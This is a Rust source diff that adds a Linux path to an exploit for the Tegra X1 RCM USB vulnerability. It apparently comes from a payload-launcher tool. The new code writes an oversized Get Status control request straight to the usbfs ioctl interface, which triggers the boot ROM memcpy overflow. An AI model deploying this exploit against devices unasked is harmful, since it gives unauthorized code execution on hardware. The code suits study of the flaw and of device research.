@@ -2,6 +2,9 @@
 
 use std::{cmp::min, time::Duration};
 
+#[cfg(target_os = "linux")]
+use nix::{fcntl, unistd::close, sys::stat::Mode};
+
 use rusb::*;
 
 use super::PAYLOAD_START_ADDR;
@@ -15,6 +18,32 @@ const RCM_VID: u16 = 0x0955;
 const DMA_LOW_BUFFER_ADDRESS: u32 = 0x40005000;
 /// Start address of the high DMA buffer in RCM mode.
 const DMA_HIGH_BUFFER_ADDRESS: u32 = 0x40009000;
+
+#[cfg(target_os = "linux")]
+mod ioctl {
+    use nix::libc::c_void;
+
+    #[repr(C)]
+    pub struct UsbDeviceUrb {
+        pub r#type: u8,
+        pub endpoint: u8,
+        pub status: i32,
+        pub flags: u32,
+        pub buffer: *mut c_void,
+        pub buffer_length: i32,
+        pub actual_length: i32,
+        pub start_frame: i32,
+        pub stream_id: u32,
+        pub error_count: i32,
+        pub signr: u32,
+        pub usercontext: *const c_void,
+    }
+
+    const URB_IOC_MAGIC: u8 = 'U' as u8;
+    const URB_IOC_NR_SUBMIT: u8 = 10;
+
+    ioctl_read!(usbdevfs_submit_urb, URB_IOC_MAGIC, URB_IOC_NR_SUBMIT, UsbDeviceUrb);
+}
 
 /// An abstraction of the Tegra X1 RCM mode.
 pub struct Rcm {
@@ -112,7 +141,7 @@ impl Rcm {
 
     /// Exploits the RCM vulnerability by triggering a largely oversized memcpy.
     ///
-    /// NOTE: The returned result is the number of bytes read in case of `Ok(n)`,
+    /// The returned result is the number of bytes read in case of `Ok(n)`,
     /// otherwise the error caused by USB.
     #[cfg(target_os = "macos")]
     pub fn memecpy(&self) -> Result<usize> {
@@ -123,7 +152,57 @@ impl Rcm {
         // Issue a Get Status control request with an Endpoint recipient which causes the
         // which causes the size of the data to copy into the DMA buffer to be set to the
         // size of the bytes requested by us.
-        self.device.read_control(0x82, 0x0, 0, 0, &mut buffer, Duration::from_millis(1000))
+        self.device.read_control(0x82, 0x00, 0, 0, &mut buffer, Duration::from_millis(1000))
+    }
+
+    /// Exploits the RCM vulnerability by triggering a largely oversized memcpy.
+    ///
+    /// NOTE: Since libusb on Linux does not allow us to blow up pages, we need
+    /// to use the raw usbfs file descriptor to trigger the vulnerability.
+    ///
+    /// The returned result is the number of bytes read in case of `Ok(n)`,
+    /// otherwise the error caused by USB.
+    #[cfg(target_os = "linux")]
+    pub fn memecpy(&self) -> Result<usize> {
+        // Calculate the length of data to request to trigger the exploit.
+        let length = (PAYLOAD_START_ADDR - self.get_dma_address()) as u16;
+
+        // Prepare the path to the USB device to access.
+        let device = self.device.device();
+        let usbfs = format!("/dev/bus/usb/{:0>3}/{:0>3}", device.bus_number(), device.address());
+
+        // Open the usbfs file descriptor.
+        let fd = fcntl::open(usbfs.as_str(), fcntl::OFlag::O_RDWR, Mode::all()).unwrap();
+
+        // Craft the Get Status packet to send over USB.
+        let mut control_message = [0; 8];
+        control_message[0] = 0x82; // Request to Endpoint recipient.
+        control_message[1] = 0x00; // Get Status request.
+        control_message[6..].copy_from_slice(&length.to_le_bytes()); // Request length.
+
+        let mut request = ioctl::UsbDeviceUrb {
+            r#type: 2,
+            endpoint: 0,
+            status: 0,
+            flags: 0,
+            buffer: control_message.as_mut_ptr() as *mut _,
+            buffer_length: control_message.len() as i32,
+            actual_length: 0,
+            start_frame: 0,
+            stream_id: 0,
+            error_count: 0,
+            signr: 0,
+            usercontext: 0x1337 as *const _,
+        };
+
+        // Submit the URB to the kernel with black ioctl magic.
+        unsafe { ioctl::usbdevfs_submit_urb(fd, &mut request).unwrap() };
+
+        // Close the usbfs file descriptor.
+        close(fd).unwrap();
+
+        // Simulate the behavior of other memecpys.
+        Err(Error::Io)
     }
 }
 
